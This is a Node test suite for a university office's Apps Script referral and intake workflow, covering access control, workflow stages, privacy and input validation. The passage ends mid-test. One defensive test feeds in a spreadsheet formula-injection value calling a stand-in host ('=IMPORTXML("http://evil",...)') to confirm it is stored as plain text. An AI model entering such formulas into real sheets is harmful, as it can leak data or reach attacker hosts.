/*
 * Test suite: runs the real Apps Script code against the in-memory mock.
 * Usage: node tests/run.js
 */
'use strict';
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const { makeWorld, loadProject } = require('./gas-mock');

const ROOT = path.join(__dirname, '..');
const read = p => fs.readFileSync(path.join(ROOT, p), 'utf8');
const plain = x => JSON.parse(JSON.stringify(x));
const same = (a, b, m) => assert.deepStrictEqual(plain(a), plain(b), m);
let passed = 0;
const failures = [];
function test(name, fn) {
  try { fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failures.push(name); console.log('  FAIL ' + name + '\n       ' + (e && e.stack || e).split('\n').slice(0, 3).join('\n       ')); }
}

/* ---------- consistency between files ---------- */
console.log('Consistency');
test('Schema.gs is identical in both Apps Script projects', () => {
  assert.strictEqual(read('apps-script/intake/Schema.gs'), read('apps-script/staff-panel/Schema.gs'));
});
test('the paste ready files in apps-script/paste are up to date', () => {
  const files = require('../tools/build-apps-script').build();
  Object.keys(files).forEach(f => assert.strictEqual(read('apps-script/paste/' + f), files[f], f + ' is stale: run node tools/build-apps-script.js'));
  assert.ok(!/<\?!=/.test(files['Panel.html']), 'Panel.html has no include left');
});
test('F003 is staff only: no F003 page or template on the public site', () => {
  assert.ok(!fs.existsSync(path.join(ROOT, 'docs/f003.html')));
  assert.ok(!fs.existsSync(path.join(ROOT, 'docs/assets/js/f003-sheet.js')));
  assert.ok(read('apps-script/staff-panel/F003Sheet.html').includes('window.IEOF003Sheet'));
  ['index.html', 'requirements.html', 'f001.html', 'f002.html', 'f004.html'].forEach(f => assert.ok(!/href="f003\.html"/.test(read('docs/' + f)), f + ' links to F003'));
});

const world0 = makeWorld();
const IEO = loadProject(path.join(ROOT, 'apps-script/intake'), world0).ctx.IEO;
const decode = s => s.replace(/&amp;/g, '&').replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&rsquo;/g, '’');
function values(file, name) {
  const html = read('docs/' + file);
  const re = new RegExp('name="' + name + '"[^>]*value="([^"]*)"|value="([^"]*)"[^>]*name="' + name + '"', 'g');
  const out = []; let m;
  while ((m = re.exec(html))) out.push(decode(m[1] || m[2]));
  return out;
}
function options(file, selectId) {
  const html = read('docs/' + file);
  const sel = new RegExp('<select[^>]*id="' + selectId + '"[\\s\\S]*?</select>').exec(html)[0];
  return [...sel.matchAll(/<option value="([^"]+)"/g)].map(m => decode(m[1]));
}
test('F001 reasons, sources and sex match the schema', () => {
  same(values('f001.html', 'reasons'), IEO.REFERRAL_REASONS);
  same(options('f001.html', 'r_source'), IEO.REFERRAL_SOURCES);
  same(values('f001.html', 's_sex'), IEO.SEX);
});
test('F002 IP groups, disabilities, sex and semesters match the schema', () => {
  same(values('f002.html', 'ip_groups'), IEO.IP_GROUPS);
  same(values('f002.html', 'disabilities'), IEO.DISABILITIES);
  same(values('f002.html', 'sex'), IEO.SEX);
  same(options('f002.html', 'semester'), IEO.SEMESTERS);
});
test('F004 professions match the schema', () => {
  same(values('f004.html', 'to_profession'), IEO.PROFESSIONS);
});
test('every form page shows the RA 10173 data privacy consent', () => {
  ['f001.html', 'f002.html', 'f004.html'].forEach(f => assert.ok(/data-consent="consent"/.test(read('docs/' + f)), f));
  assert.ok(read('docs/assets/js/common.js').includes('Data Privacy Act of 2012'));
  assert.ok(read('docs/f002.html').includes('data-consent'), 'F002 consent');
});
test('the public site holds no student data files', () => {
  const walk = d => fs.readdirSync(d, { withFileTypes: true }).flatMap(e => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
  const bad = walk(path.join(ROOT, 'docs')).filter(f => /\.(csv|xlsx?|json|docx?|pdf)$/i.test(f));
  same(bad, []);
});

/* ---------- backend behaviour ---------- */
const world = makeWorld();
const intake = loadProject(path.join(ROOT, 'apps-script/intake'), world);
const STAFF = 'case.manager@rtu.edu.ph';
const staff = loadProject(path.join(ROOT, 'apps-script/staff-panel'), world, { email: STAFF });
const I = intake.ctx, S = staff.ctx;

const sheetId = I.setup();
staff.props.SHEET_ID = sheetId;
staff.props.STAFF_EMAILS = 'director@rtu.edu.ph, ' + STAFF.toUpperCase();
staff.props.SITE_URL = 'https://example.github.io/rtu-ieo-intake';
const ss = world.SpreadsheetApp.openById(sheetId);
const rows = tab => S.ieoReadAll_(tab);

/** Follow up attempt 1 answered right away (the student walked in), so the documents step opens. */
function responded(ref) { return S.logContactAttempt(ref, { method: 'In person', to: '', result: 'Responded', note: 'walked in' }); }
let keepRate = false; // the flood guard test turns this on
function post(action, data, token, extra) {
  if (!keepRate) Object.keys(intake.cache).filter(k => k.indexOf('rate:') === 0).forEach(k => delete intake.cache[k]);
  const body = Object.assign({ action, data, token }, extra || {});
  return JSON.parse(I.doPost({ postData: { contents: JSON.stringify(body) } }).getContent());
}
function status(token) { return JSON.parse(I.doGet({ parameter: { action: 'status', t: token } }).getContent()); }
const tokenOf = link => /#t=([a-f0-9]{64})$/.exec(link)[1];

const futureDay = new Date(Date.now() + 8 * 3600000 + 3 * 86400000).toISOString().slice(0, 10);
const SCHED = { date: futureDay, start: '09:00', end: '10:00', mode: 'In person', venue: '', send_email: false, send_invite: false };
const F001 = {
  s_name: 'Dela Cruz, Juan Santos', s_program: 'BS Electronics Engineering', s_department: 'CEIT', s_student_no: '2026-100234', s_email: 'Juan.DelaCruz@rtu.edu.ph',
  s_birthday: '2007-03-14', s_age: '19', s_sex: 'Male', reasons: ['Academic Challenges', 'Others'], reason_other: 'Frequent absences',
  r_name: 'Maria Reyes', r_contact: '09171234567', r_department: 'CEIT', r_email: 'mreyes@rtu.edu.ph', r_designation: 'Instructor',
  r_source: 'Faculty', observations: 'Has trouble reading the board.', attest_name: 'maria  reyes', client_datetime: 'today', consent: true
};

console.log('Setup');
test('setup() creates every tab with its headers', () => {
  Object.keys(IEO.SHEETS).forEach(n => {
    const sh = ss.getSheetByName(n);
    assert.ok(sh, n);
    same(sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0], IEO.SHEETS[n]);
  });
  assert.strictEqual(ss.getSheetByName('Sheet1'), null);
});
test('setup() can run twice safely', () => { assert.strictEqual(I.setup(), sheetId); });
test('setup() makes the account that runs it the alert recipient', () => {
  assert.strictEqual(intake.props.ALERT_EMAILS, 'ieo.owner@gmail.com');
});

console.log('F001 Referral Slip (public)');
let caseId;
test('a valid referral creates a case and returns only a reference number', () => {
  const r = post('submit_f001', F001);
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.match(r.ref, /^IEO-\d{4}-0001$/);
  same(Object.keys(r).sort(), ['ok', 'ref', 'submittedAt']);
  caseId = r.ref;
  const c = rows('Cases')[0];
  assert.strictEqual(c.stage, 'RECEIVED');
  assert.strictEqual(c.student_no, '2026-100234');
  assert.strictEqual(rows('F001_Referrals')[0].r_contact, '09171234567', 'leading zero kept');
  assert.strictEqual(rows('F001_Referrals')[0].reasons, 'Academic Challenges; Others');
});
test('a new referral emails the IEO alert list without student details', () => {
  const m = world.mail.filter(x => /New referral slip/.test(x.subject));
  assert.strictEqual(m.length, 1);
  assert.strictEqual(m[0].to, 'ieo.owner@gmail.com');
  assert.ok(m[0].body.includes(caseId));
  ['Dela Cruz', 'Juan', 'Maria Reyes', '0917', 'read the board'].forEach(t => assert.ok(!m[0].body.includes(t) && !m[0].subject.includes(t), 'leaks ' + t));
});
test('a failed alert email does not lose the referral', () => {
  world.failMail = true;
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Mail Fail' }));
  world.failMail = false;
  assert.strictEqual(r.ok, true);
});
test('the student email is required, checked, and saved on the case', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { s_email: 'not-an-email' })).fields.s_email);
  assert.strictEqual(rows('Cases')[0].student_email, 'juan.delacruz@rtu.edu.ph');
  assert.strictEqual(S.getCase(caseId).suggestedStudentEmail, 'juan.delacruz@rtu.edu.ph');
});
test('an older spreadsheet without the new columns is upgraded automatically', () => {
  const sh = ss.getSheetByName('F001_Referrals');
  const col = sh.data[0].indexOf('s_email');
  sh.data.forEach(r => r.splice(col, 1));
  assert.strictEqual(post('submit_f001', Object.assign({}, F001, { s_name: 'Upgrade Test' })).ok, true);
  assert.strictEqual(rows('F001_Referrals').pop().s_email, 'Juan.DelaCruz@rtu.edu.ph');
});
test('case numbers count up', () => {
  assert.match(post('submit_f001', Object.assign({}, F001, { s_name: 'Second Student' })).ref, /-0004$/);
});
test('missing required answers come back as field errors', () => {
  const r = post('submit_f001', { consent: true });
  assert.strictEqual(r.ok, false);
  ['s_name', 's_program', 's_department', 's_email', 'reasons', 'r_name', 'r_source', 'attest_name', 'r_contact'].forEach(k => assert.ok(r.fields[k], k));
});
test('the earlier reason wording is still accepted', () => {
  assert.strictEqual(post('submit_f001', Object.assign({}, F001, { s_name: 'Old Page', reasons: ['Academic Challenged'] })).ok, true);
});
test('F001 has its own consent text; F002 keeps the original RTU consent', () => {
  const f1 = read('docs/f001.html');
  assert.ok(/data-consent-full/.test(f1) && f1.includes('grant my voluntary consent') && f1.includes('his/her own consent'));
  assert.ok(!/data-consent-full/.test(read('docs/f002.html')));
  assert.ok(read('docs/assets/js/common.js').includes('free, voluntary and unconditional consent'));
});
test('consent is required', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { consent: false })).fields.consent);
});
test('the typed signature must match the referring person', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { attest_name: 'Someone Else' })).fields.attest_name);
});
test('options outside the original form are rejected', () => {
  const r = post('submit_f001', Object.assign({}, F001, { r_source: 'Hacker', reasons: ['Invented'] }));
  assert.ok(r.fields.r_source && r.fields.reasons);
});
test('"Others" source needs a specification', () => {
  assert.ok(post('submit_f001', Object.assign({}, F001, { r_source: 'Others' })).fields.r_source_other);
});
test('spreadsheet formulas typed into fields are stored as plain text', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: '=IMPORTXML("http://evil","//a")', observations: '+cmd', r_name: '@x', attest_name: '@x' }));
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  const last = rows('F001_Referrals').pop();
  assert.strictEqual(last.s_name, '=IMPORTXML("http://evil","//a")');
});
test('the honeypot field silently drops bots', () => {
  const before = rows('Cases').length;
  const r = post('submit_f001', F001, null, { website: 'http://spam' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(rows('Cases').length, before);
});
test('very long input is cut to the field limit', () => {
  post('submit_f001', Object.assign({}, F001, { observations: 'x'.repeat(10000) }));
  assert.strictEqual(rows('F001_Referrals').pop().observations.length, 4000);
});

console.log('Staff panel access control');
test('a non-staff Google account gets the access denied page and no data', () => {
  staff.user.email = 'student@gmail.com';
  const html = S.doGet().getContent();
  assert.ok(/not on the staff list/.test(html));
  assert.ok(!html.includes('Dela Cruz'));
  ['listCases', 'getConfig'].forEach(fn => assert.throws(() => S[fn](), /Not authorized/));
  assert.throws(() => S.getCase(caseId), /Not authorized/);
  assert.throws(() => S.saveRiskNote(caseId, 'x'), /Not authorized/);
});
test('an anonymous visitor is denied', () => {
  staff.user.email = '';
  assert.throws(() => S.listCases(), /Not authorized/);
});
test('an allowlisted account (any letter case) gets the panel', () => {
  staff.user.email = STAFF;
  const html = S.doGet().getContent();
  assert.ok(html.includes('IEO staff panel') && html.includes('IEOF003Sheet'));
  assert.ok(S.listCases().length >= 3);
});
test('getCase never exposes the link hash', () => {
  assert.ok(!('link_hash' in S.getCase(caseId).caseRecord));
});

console.log('SOP workflow');
test('the interview cannot start before the reason for referral review', () => {
  assert.throws(() => S.proceedToInterview(caseId, SCHED), /reason for referral review/);
});
test('save the reason for referral review and assign a case manager', () => {
  assert.strictEqual(S.saveRiskNote(caseId, 'Risk: falling behind. Opportunity: early support.').ok, true);
  assert.strictEqual(S.assignCaseManager(caseId, STAFF).ok, true);
});
test('a case manager must be on the staff list, and is required before the follow up', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'No Manager Yet' }));
  S.saveRiskNote(r.ref, 'note');
  assert.throws(() => S.logContactAttempt(r.ref, { method: 'Phone' }), /Assign a case manager/);
  assert.throws(() => S.assignCaseManager(r.ref, 'outsider@gmail.com'), /staff list/);
  S.assignCaseManager(r.ref, 'Director@rtu.edu.ph');
  assert.strictEqual(S.ieoFindCase_(r.ref).case_manager, 'director@rtu.edu.ph');
  assert.ok(S.getConfig().staffList.indexOf(STAFF) >= 0);
});
test('once assigned, alert emails for the case go to the case manager', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Alert Routing' }));
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, 'director@rtu.edu.ph');
  const before = world.mail.length;
  post('submit_f004', { case_id: r.ref, s_name: 'Alert Routing', s_email: 'juan.delacruz@rtu.edu.ph', to_profession: 'Physician', consent: true });
  const alert = world.mail.slice(before).find(m => /Request for Referral Form/.test(m.subject));
  assert.strictEqual(alert.to, 'director@rtu.edu.ph');
  assert.ok(S.listCases().some(c => c.case_id === r.ref && c.case_manager === 'director@rtu.edu.ph'));
});
test('the documents step stays locked until someone responds to the follow up', () => {
  S.saveDocuments(caseId, ['NEURODIVERGENT'], ['clinical_dx']);
  assert.throws(() => S.proceedToInterview(caseId, SCHED), /follow up/);
  assert.throws(() => S.markDocumentsPending(caseId), /follow up/);
});
test('follow up attempt 1 emails the student a ready template and waits 3 working days', () => {
  const v = S.getCase(caseId);
  assert.strictEqual(v.followUp.status, 'NOT_STARTED');
  same(v.followUp.plan.map(p => p.target), ['student', 'referrer', 'dept_head']);
  const d = v.followUp.draft;
  assert.strictEqual(d.to, 'juan.delacruz@rtu.edu.ph');
  assert.ok(/required documents/.test(d.subject) && d.body.includes('Clinical diagnosis'));
  assert.ok(d.body.startsWith('Dear Juan Santos Dela Cruz,'), 'name in reading order');
  const before = world.mail.length;
  const r = S.logContactAttempt(caseId, { method: 'Email', to: d.to, subject: d.subject, body: d.body });
  assert.strictEqual(world.mail.length, before + 1);
  assert.strictEqual(world.mail[world.mail.length - 1].from, STAFF);
  assert.strictEqual(r.due, S.ieoAddWorkingDays_(S.ieoToday_(), 3));
  assert.strictEqual(S.ieoFindCase_(caseId).followup_status, 'IN_PROGRESS');
});
test('"No response" is refused before the 3 working days are up', () => {
  assert.throws(() => S.recordContactResult(caseId, 'No response', ''), /Wait until/);
  assert.throws(() => S.logContactAttempt(caseId, { method: 'Phone' }), /still waiting/);
});
test('a response ends the follow up and opens the documents step', () => {
  S.recordContactResult(caseId, 'Responded', 'Replied by email');
  assert.strictEqual(S.ieoFindCase_(caseId).followup_status, 'RESPONDED');
  assert.throws(() => S.logContactAttempt(caseId, { method: 'Phone' }), /already responded/);
  S.saveDocuments(caseId, [], []);
});
test('the process may not push forward without the required documents', () => {
  S.saveDocuments(caseId, ['NEURODIVERGENT'], ['pwd_id']);
  assert.throws(() => S.proceedToInterview(caseId, SCHED), /may not push forward.*Clinical diagnosis/);
});
test('portfolio cannot be submitted before the interview stage', () => {
  assert.strictEqual(status('a'.repeat(64)).valid, false);
});
test('documents incomplete marks the case and allows F003 for neurodivergent cases', () => {
  S.markDocumentsPending(caseId);
  assert.strictEqual(rows('Cases')[0].stage, 'DOCS_PENDING');
  const rec = S.issueF003(caseId, { to_profession: 'Psychiatrist', to_name: 'Dr. Santos', docs_requested: [], issued_by: 'Case Manager' });
  assert.ok(rec.ok);
  same(rec.docs_requested, ['Clinical diagnosis'], 'clinical diagnosis always requested');
  assert.strictEqual(rows('F003_Referrals').length, 1);
  assert.strictEqual(Number(rows('Cases')[0].f003_issued_count), 1);
});
test('F003 is refused for IP or PDL cases (they submit the documents directly)', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'IP Student' }));
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, STAFF); responded(r.ref);
  S.saveDocuments(r.ref, ['IP'], []);
  assert.throws(() => S.issueF003(r.ref, { to_profession: 'Physician' }), /F003 applies/);
});
test('IP needs a COC or a Tribal/Community Endorsement (either one)', () => {
  assert.strictEqual(S.ieoEvaluateDocuments_(['IP'], []).complete, false);
  assert.strictEqual(S.ieoEvaluateDocuments_(['IP'], ['tribal_endorsement']).complete, true);
  assert.strictEqual(S.ieoEvaluateDocuments_(['IP'], ['coc']).complete, true);
});
test('PDL needs both the BJMP endorsement and the CAWO clearance', () => {
  assert.strictEqual(S.ieoEvaluateDocuments_(['PDL'], ['bjmp_endorsement']).complete, false);
  assert.strictEqual(S.ieoEvaluateDocuments_(['PDL'], ['bjmp_endorsement', 'cawo_clearance']).complete, true);
});
test('several categories combine their requirements', () => {
  const ev = S.ieoEvaluateDocuments_(['PHYSICAL_SENSORY', 'IP'], ['clinical_dx']);
  assert.strictEqual(ev.complete, false);
  assert.strictEqual(S.ieoEvaluateDocuments_(['PHYSICAL_SENSORY', 'IP'], ['clinical_dx', 'coc']).complete, true);
});
test('no category means not complete', () => {
  assert.strictEqual(S.ieoEvaluateDocuments_([], ['clinical_dx']).complete, false);
});

let portfolioToken;
test('with the clinical diagnosis checked the interview opens and a link is issued', () => {
  S.saveDocuments(caseId, ['NEURODIVERGENT'], ['clinical_dx', 'pwd_id']);
  const r = S.proceedToInterview(caseId, Object.assign({}, SCHED, { student_email: 'juan@example.com', also_invite: 'casemanager2@rtu.edu.ph', send_email: true, send_invite: true }));
  assert.match(r.link, /^https:\/\/example\.github\.io\/rtu-ieo-intake\/f002\.html#t=[a-f0-9]{64}$/);
  portfolioToken = tokenOf(r.link);
  assert.strictEqual(rows('Cases')[0].stage, 'INTERVIEW');
  assert.notStrictEqual(rows('Cases')[0].link_hash, portfolioToken, 'only the hash is stored');
});
test('scheduling stores the interview, emails the student the schedule and link, and sends a calendar invite', () => {
  const c = rows('Cases')[0];
  assert.strictEqual(c.interview_start, futureDay + ' 09:00');
  assert.strictEqual(c.interview_venue, IEO.DEFAULT_VENUE);
  assert.strictEqual(c.student_email, 'juan@example.com');
  const m = world.mail.filter(x => x.to === 'juan@example.com').pop();
  assert.ok(m && /interview schedule/.test(m.subject));
  assert.ok(m.body.includes(portfolioToken), 'portfolio link in the email');
  assert.strictEqual(m.from, STAFF, 'sent from the staff account');
  const e = world.events[c.calendar_event_id];
  assert.ok(e, 'calendar event created');
  assert.ok(!e.title.includes('Dela Cruz'), 'no name in the event title');
  assert.deepStrictEqual(e.guests, ['juan@example.com', 'casemanager2@rtu.edu.ph']);
  assert.strictEqual(e.start.toISOString(), new Date(futureDay + 'T09:00:00+08:00').toISOString());
});
test('schedule checks: past date, end before start, online needs a link, email needed to notify', () => {
  const base = { start: '09:00', end: '10:00', mode: 'In person' };
  assert.throws(() => S.parseSchedule_(Object.assign({ date: '2020-01-01' }, base)), /past/);
  assert.throws(() => S.parseSchedule_({ date: futureDay, start: '10:00', end: '09:00' }), /after the start/);
  assert.throws(() => S.parseSchedule_({ date: futureDay, start: '09:00', end: '10:00', mode: 'Online', venue: 'room 1' }), /meeting link/);
  assert.throws(() => S.parseSchedule_(Object.assign({ date: futureDay, send_invite: true }, base)), /student email/);
});
test('rescheduling moves the same calendar event and emails the new schedule without a new link', () => {
  const before = rows('Cases')[0].calendar_event_id;
  S.rescheduleInterview(caseId, { date: futureDay, start: '13:00', end: '14:30', mode: 'Online', venue: 'https://meet.google.com/abc-defg-hij', student_email: 'juan@example.com', send_email: true, send_invite: true });
  const c = rows('Cases')[0];
  assert.strictEqual(c.calendar_event_id, before, 'same event');
  assert.strictEqual(world.events[before].start.toISOString(), new Date(futureDay + 'T13:00:00+08:00').toISOString());
  assert.strictEqual(world.events[before].guests.length, 2, 'no duplicate guests');
  const m = world.mail.filter(x => x.to === 'juan@example.com').pop();
  assert.ok(/moved/.test(m.subject) && !/#t=/.test(m.body));
  assert.strictEqual(c.interview_mode, 'Online');
});
test('a calendar problem is reported but does not block scheduling', () => {
  staff.props.CALENDAR_ID = 'ieo@group.calendar.google.com';
  world.sharedCalendars = { 'ieo@group.calendar.google.com': ['someone.else@rtu.edu.ph'] };
  const r = S.rescheduleInterview(caseId, Object.assign({}, SCHED, { student_email: 'juan@example.com', send_invite: true }));
  assert.ok(r.ok && !r.eventCreated && /calendar invite could not be sent/.test(r.warnings[0]));
  world.sharedCalendars['ieo@group.calendar.google.com'].push(STAFF);
  const r2 = S.rescheduleInterview(caseId, Object.assign({}, SCHED, { student_email: 'juan@example.com', send_invite: true }));
  assert.ok(r2.eventCreated, 'shared IEO calendar used when CALENDAR_ID is set and shared');
  delete staff.props.CALENDAR_ID;
});
test('upcoming interviews show in the case list', () => {
  assert.ok(S.listCases().some(c => c.case_id === caseId && c.interview_start === futureDay + ' 09:00'));
});
test('documents are locked after the interview opens', () => {
  assert.throws(() => S.saveDocuments(caseId, ['NEURODIVERGENT'], []), /before the interview/);
});
test('the link status reveals no personal data', () => {
  const s = status(portfolioToken);
  same(s, { ok: true, valid: true, portfolioOpen: true, portfolioSubmitted: false, waiverOpen: false });
  same(status('not-a-token'), { ok: true, valid: false });
});

const F002 = {
  course: 'BSECE', last_name: 'Dela Cruz', first_name: 'Juan', middle_name: 'Santos', nickname: 'Jun',
  present_address: 'Mandaluyong City', provincial_address: '', age: '19', sex: 'Male', civil_status: 'Single', religion: '',
  nationality: 'Filipino', telephone: '', mobile: '09181234567', email: 'juan@example.com', pwd_id: '',
  ip_member: 'Yes', ip_groups: ['Ifugao', 'Others'], ip_other: 'Kalinga',
  emergency_name: 'Ana Dela Cruz', emergency_relationship: 'Mother', emergency_address: 'Mandaluyong', emergency_contact: '09190000000',
  elem_school: 'X Elementary', elem_year: '2019', jhs_school: 'Y High', jhs_year: '2023', shs_school: 'Z SHS', shs_year: '2025', shs_track: 'Academic', shs_strand: 'STEM',
  disabilities: ['Learning Disability (e.g. Dyslexia, Dyscalculia, Dysgraphia)', 'Others'], disability_other: 'ADHD',
  medications: 'None', precautions: 'Seat near the front',
  photo_note_ack: true, disclaimer_ack: true, consent: true, signature_name: 'Juan Santos Dela Cruz'
};
test('a portfolio without a valid link is refused', () => {
  assert.match(post('submit_f002', F002, 'b'.repeat(64)).error, /not valid/);
  assert.match(post('submit_f002', F002, undefined).error, /not valid/);
});
test('portfolio validation: IP group needed when Yes, Others needs text, acknowledgements needed', () => {
  const r = post('submit_f002', Object.assign({}, F002, { ip_groups: [], disability_other: '', disclaimer_ack: false, photo_note_ack: false }), portfolioToken);
  assert.ok(r.fields.ip_groups && r.fields.disability_other && r.fields.disclaimer_ack && r.fields.photo_note_ack);
});
test('the waiver cannot be signed before the decision', () => {
  assert.match(post('submit_waiver', { waiver_name: 'Juan', ay_start: '2026', ay_end: '2027', semester: '1st', signature_name: 'Juan', consent: true }, portfolioToken).error, /waiver is not open/);
});
test('the student can save progress (after consent), and get their own answers back by link', () => {
  assert.ok(post('save_f002', { course: 'BSECE' }, portfolioToken).fields.consent, 'consent needed to save');
  const r = post('save_f002', { course: 'BSECE', last_name: 'Dela Cruz', ip_member: 'Yes', ip_groups: ['Ifugao'], disabilities: ['Bad value'], consent: true }, portfolioToken);
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  const row = rows('F002_Portfolios').filter(x => x.case_id === caseId);
  assert.strictEqual(row.length, 1);
  assert.strictEqual(row[0].status, 'Draft');
  assert.strictEqual(S.ieoFindCase_(caseId).stage, 'INTERVIEW', 'a draft is not a submission');
  const l = post('load_f002', {}, portfolioToken);
  assert.strictEqual(l.status, 'Draft');
  assert.strictEqual(l.data.last_name, 'Dela Cruz');
  same(l.data.ip_groups, ['Ifugao']);
  same(l.data.disabilities, [], 'invalid options are dropped');
  assert.strictEqual(l.data.consent, true);
  assert.match(post('load_f002', {}, 'f'.repeat(64)).error, /not valid/);
});
test('a valid portfolio is submitted (one row per case)', () => {
  const r = post('submit_f002', F002, portfolioToken);
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.ok(world.mail.some(x => /Student portfolio submitted/.test(x.subject) && x.subject.includes(caseId)), 'staff alerted');
  const p = rows('F002_Portfolios')[0];
  assert.strictEqual(p.ip_groups, 'Ifugao; Others');
  assert.strictEqual(rows('Cases')[0].stage, 'PORTFOLIO_SUBMITTED');
  assert.strictEqual(rows('F002_Portfolios').filter(x => x.case_id === caseId).length, 1);
  assert.strictEqual(p.status, 'Submitted');
  const s2 = status(portfolioToken);
  assert.ok(s2.portfolioOpen && s2.portfolioSubmitted, 'still open for changes');
  assert.match(post('save_f002', Object.assign({}, F002), portfolioToken).error, /submit again/);
});
test('after submitting, the student can change answers and submit again until the decision', () => {
  const before = world.mail.length;
  const r = post('submit_f002', Object.assign({}, F002, { nickname: 'Juanito' }), portfolioToken);
  assert.ok(r.ok && r.updated);
  assert.strictEqual(rows('F002_Portfolios').filter(x => x.case_id === caseId)[0].nickname, 'Juanito');
  assert.ok(world.mail.slice(before).some(m => /portfolio updated/.test(m.subject)));
  assert.strictEqual(post('load_f002', {}, portfolioToken).data.nickname, 'Juanito');
});
test('sessions and case notes are staff only and saved', () => {
  S.saveSession(caseId, { session: 'Intake', date: '2026-10-20', time_started: '09:00', time_ended: '10:00', attended_by: 'Case Manager' });
  S.saveSession(caseId, { session: 'Intake', date: '2026-10-21', time_started: '09:30', time_ended: '10:00', attended_by: 'Case Manager' });
  assert.strictEqual(rows('Sessions').length, 1, 'same session updates in place');
  assert.strictEqual(rows('Sessions')[0].date, '2026-10-21');
  assert.throws(() => S.saveSession(caseId, { session: 'Session 99' }), /Unknown session/);
  S.addCaseNote(caseId, 'Discussed reading support.');
  assert.strictEqual(S.getCase(caseId).notes[0].author, STAFF);
});
let waiverToken;
test('"No educational assistance needed" unlocks the waiver and retires the portfolio link', () => {
  const r = S.recordDecision(caseId, false);
  waiverToken = tokenOf(r.link);
  assert.strictEqual(rows('Cases')[0].stage, 'WAIVER_PENDING');
  assert.strictEqual(status(portfolioToken).valid, false);
  same(status(waiverToken), { ok: true, valid: true, portfolioOpen: false, portfolioSubmitted: false, waiverOpen: true });
});
test('the decision locks the portfolio: no more loading, saving or submitting', () => {
  assert.strictEqual(post('load_f002', {}, portfolioToken).ok, false);
  assert.strictEqual(post('submit_f002', F002, portfolioToken).ok, false);
  assert.strictEqual(post('save_f002', { consent: true }, portfolioToken).ok, false);
});
test('waiver checks: academic year runs one year, signature matches name', () => {
  const r = post('submit_waiver', { waiver_name: 'Juan Dela Cruz', ay_start: '2026', ay_end: '2028', semester: '1st', signature_name: 'J D C', consent: true }, waiverToken);
  assert.ok(r.fields.ay_end && r.fields.signature_name);
});
test('the waiver is signed and the link stops working', () => {
  const r = post('submit_waiver', { waiver_name: 'Juan Dela Cruz', ay_start: '2026', ay_end: '2027', semester: '1st', signature_name: 'Juan Dela Cruz', consent: true }, waiverToken);
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.strictEqual(rows('Cases')[0].stage, 'WAIVER_SIGNED');
  assert.strictEqual(status(waiverToken).valid, false);
});
test('the case closes at End of Process', () => {
  S.closeCase(caseId, '');
  const c = rows('Cases')[0];
  assert.strictEqual(c.stage, 'CLOSED');
  assert.strictEqual(c.close_reason, 'Completed');
});
test('"Yes" goes to ISP (SOP-OVPAA-IEO-02) without a waiver', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'ISP Student' }));
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, STAFF); responded(r.ref);
  S.saveDocuments(r.ref, ['PDL'], ['bjmp_endorsement', 'cawo_clearance']);
  const t = tokenOf(S.proceedToInterview(r.ref, SCHED).link);
  assert.strictEqual(post('submit_f002', Object.assign({}, F002, { ip_member: 'No' }), t).ok, true);
  S.recordDecision(r.ref, true);
  const c = S.ieoFindCase_(r.ref);
  assert.strictEqual(c.stage, 'ISP');
  assert.match(c.decision, /SOP-OVPAA-IEO-02/);
  assert.throws(() => S.reissueLink(r.ref), /only used while waiting/);
});
test('reissuing a link invalidates the old one', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Reissue Student' }));
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, STAFF); responded(r.ref);
  S.saveDocuments(r.ref, ['IP'], ['coc']);
  const t1 = tokenOf(S.proceedToInterview(r.ref, SCHED).link);
  const t2 = tokenOf(S.reissueLink(r.ref).link);
  assert.strictEqual(status(t1).valid, false);
  assert.strictEqual(status(t2).portfolioOpen, true);
});
test('expired links are refused', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Old Link' }));
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, STAFF); responded(r.ref);
  S.saveDocuments(r.ref, ['IP'], ['coc']);
  const t = tokenOf(S.proceedToInterview(r.ref, SCHED).link);
  const c = S.ieoFindCase_(r.ref);
  S.ieoUpdate_('Cases', c._row, { link_issued_at: '2020-01-01 00:00:00' });
  assert.strictEqual(status(t).valid, false);
  assert.match(post('submit_f002', F002, t).error, /expired/);
});
test('closing early needs a reason, and cancels a future interview invite', () => {
  const r = post('submit_f001', Object.assign({}, F001, { s_name: 'Withdrawn' }));
  assert.throws(() => S.closeCase(r.ref, ''), /reason/);
  S.saveRiskNote(r.ref, 'note'); S.assignCaseManager(r.ref, STAFF); responded(r.ref);
  S.saveDocuments(r.ref, ['IP'], ['coc']);
  S.proceedToInterview(r.ref, Object.assign({}, SCHED, { student_email: 'w@example.com', send_invite: true }));
  const evId = S.ieoFindCase_(r.ref).calendar_event_id;
  S.closeCase(r.ref, 'Student withdrew');
  assert.strictEqual(S.ieoFindCase_(r.ref).stage, 'CLOSED');
  assert.strictEqual(world.events[evId].deleted, true);
});
test('every staff action is in the audit log with the staff email', () => {
  const log = rows('AuditLog');
